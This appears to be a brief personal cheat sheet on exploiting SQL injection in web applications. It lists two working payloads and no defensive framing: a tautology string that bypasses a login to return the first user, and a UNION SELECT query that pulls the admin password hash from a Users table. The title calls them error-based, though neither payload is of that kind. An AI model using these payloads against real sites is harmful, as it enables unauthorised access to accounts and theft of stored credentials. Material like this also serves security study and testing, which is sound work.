# Exploiting error based SQL injection

### Get the result of first user without knowing any user name with sqli
```
' or '1'='1
```

### Exfiltrate admin password hash
```
' UNION SELECT password,1 from Users where login='admin' -- //
```
